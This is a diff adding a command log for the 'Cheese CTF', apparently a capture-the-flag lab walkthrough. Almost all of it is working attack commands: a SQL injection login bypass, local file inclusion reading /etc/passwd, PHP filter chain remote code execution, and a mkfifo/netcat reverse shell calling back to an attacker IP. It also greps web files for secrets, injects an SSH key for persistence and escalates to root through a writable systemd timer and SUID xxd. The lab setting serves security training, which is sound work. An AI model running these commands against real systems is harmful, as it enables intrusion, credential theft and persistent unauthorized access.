@@ -1,0 +1,111 @@
+# Cheese CTF - Commands Used
+
+# Reconnaissance
+nmap -sS 10.x.x.x
+feroxbuster -u http://10.x.x.x -w /usr/share/dirb/wordlists/common.txt -x php,txt,html
+
+# SQL Injection testing
+ffuf -w /usr/share/seclists/Fuzzing/login_bypass.txt -u http://10.x.x.x/login.php -X POST -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" -mc all
+
+# Working login bypass payload
+# Username: ' OR 'x'='x'#;
+# Password: test
+
+# Local File Inclusion
+# Browser:
+# http://10.x.x.x/secret-script.php?file=../../../../../../etc/passwd
+
+# Reading PHP source
+# Browser:
+# http://10.x.x.x/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php
+
+# Decode returned Base64
+echo 'PASTE_BASE64_HERE' | base64 -d
+
+# php_filter_chain_generator setup
+git clone https://github.com/synacktiv/php_filter_chain_generator.git
+cd php_filter_chain_generator
+
+# Test RCE with id
+python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
+payload='php://filter/...'
+curl -G --output - 'http://10.x.x.x/secret-script.php' --data-urlencode "file=$payload"
+
+# Check VPN IP for reverse shell callback
+ip a | grep tun0
+
+# Reverse shell listener
+nc -lvnp 4444
+
+# Reverse shell payload generation
+python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.x.x 4444 >/tmp/f"); ?>'
+
+# Trigger reverse shell
+payload=$(python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.x.x 4444 >/tmp/f"); ?>' | tail -n 1)
+curl -s -G 'http://10.x.x.x/secret-script.php' --data-urlencode "file=$payload" > /dev/null
+
+# Post-exploitation enumeration
+whoami
+pwd
+ls
+cat /etc/passwd | grep sh
+ls -la /home/*
+grep -Rni "pass\|password\|user\|admin\|secret\|token" /var/www/html 2>/dev/null
+
+# MySQL enumeration
+mysql -u comte -p
+SHOW DATABASES;
+USE users;
+SHOW TABLES;
+SELECT * FROM users;
+
+# SSH key injection path
+ls -ld /home/comte/.ssh /home/ubuntu/.ssh
+ls -l /home/comte/.ssh /home/ubuntu/.ssh
+find /home -name authorized_keys -ls 2>/dev/null
+
+# Generate SSH key pair on attacker machine
+ssh-keygen -t rsa -b 4096 -f cheese_key -N ""
+cat cheese_key.pub
+
+# Append public key on target
+echo 'ssh-rsa AAAA... kali@kali' >> /home/comte/.ssh/authorized_keys
+tail -n 1 /home/comte/.ssh/authorized_keys
+
+# SSH as comte
+ssh -i cheese_key comte@10.x.x.x
+
+# User flag
+whoami
+ls
+cat user.txt
+
+# Privilege escalation
+sudo -l
+systemctl cat exploit.timer
+systemctl cat exploit.service
+cat /etc/systemd/system/exploit.timer
+cat /etc/systemd/system/exploit.service
+ls -l /etc/systemd/system/exploit.timer /etc/systemd/system/exploit.service
+
+# Fix exploit.timer
+cat > /etc/systemd/system/exploit.timer << 'EOF'
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=1sec
+Unit=exploit.service
+
+[Install]
+WantedBy=timers.target
+EOF
+
+# Reload and trigger timer
+sudo systemctl daemon-reload
+sudo systemctl start exploit.timer
+sleep 2
+ls -l /opt/xxd
+
+# Read root flag via SUID xxd
+/opt/xxd /root/root.txt | /opt/xxd -r
